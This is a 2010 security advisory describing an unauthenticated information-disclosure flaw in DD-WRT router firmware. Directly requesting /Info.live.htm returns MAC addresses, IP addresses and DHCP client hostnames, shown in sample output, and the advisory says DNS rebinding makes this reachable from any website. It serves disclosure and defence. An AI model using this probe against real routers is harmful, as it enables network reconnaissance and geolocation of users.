# Exploit Title: DD-WRT Information Disclosure Vulnerability
# Date: 26-Dec-2010
# Author: Craig Heffner, /dev/ttyS0
# Software Link: http://www.dd-wrt.com
# Version: v24-preSP2
# Tested on: builds 14311, 14896

Remote attackers can gain sensitive information about a DD-WRT router and internal clients, including IP addresses, MAC addresses and host names. This information can be used for further network attacks as well as very accurate MAC address geolocation (see: http://samy.pl/mapxss/). This is exploitable even if remote administration is disabled.

Users who enable remote administration typically set the info page to 'disabled' or 'enabled with authentication' in order to prevent remote users from obtaining this information without first authenticating to the router. However, if the info page is set to 'disabled', the /Info.live.htm page can still be accessed directly by an unauthenticated remote attacker, which returns the following data:

{lan_mac::00:22:B0:9B:1C:D3}
{wan_mac::00:22:B0:9B:1C:D4}
{wl_mac::00:22:B0:9B:1C:D5}
{lan_ip::192.168.1.1}
{wl_channel::6}
{wl_radio::Radio is On}
{wl_xmit::71 mW}
{wl_rate::270 Mbps}
{packet_info::SWRXgoodPacket=
0;SWRXerrorPacket=0;SWTXgoodPacket=302;SWTXerror
Packet=17;}
{wl_mode_short::ap}
{lan_proto::dhcp}
{mem_info::,'total:','used:','free:','shared:','buffers:','cached:','Mem:','13316096','11509760','1806
336','0','1556480','4431872','Swap:','0','0','0','MemTotal:','13004','kB','MemFree:','1764','kB','Me
mShared:','0','kB','Buffers:','1520','kB','Cached:','4328','kB','SwapCached:','0','kB','Active:','4136'
,'kB','Inactive:','1724','kB','HighTotal:','0','kB','HighFree:','0','kB','LowTotal:','13004','kB','LowFr
ee:','1764','kB','SwapTotal:','0','kB','SwapFree:','0','kB'}
{active_wireless::}
{active_wds::}
{dhcp_leases:: 'joes-desktop','192.168.1.102','xx:xx:xx:xx:2E:41','1 day 00:00:00','102'}
{dhcp_leases:: 'marys-laptop','192.168.1.105','xx:xx:xx:xx:55:E2','1 day 00:00:00','105'}
{uptime:: 01:35:40 up 8 min, load average: 1.60, 0.80, 0.36}
{ipinfo:: IP: 1.1.1.1}
{wan_ipaddr::1.1.1.1}
{gps_text::}
{gps_lat::}
{gps_lon::}
{gps_alt::}
{gps_sat::}


Since DD-WRT is also vulnerable to a public IP DNS rebinding attack, this vulnerability affects routers that have remote administration disabled as well, and can be exploited by any Web site that is viewed by an internal, unauthenticated user. The Rebind tool easily facilitates this type of rebinding attack (http://rebind.googlecode.com).

More details and a demo video available at: http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/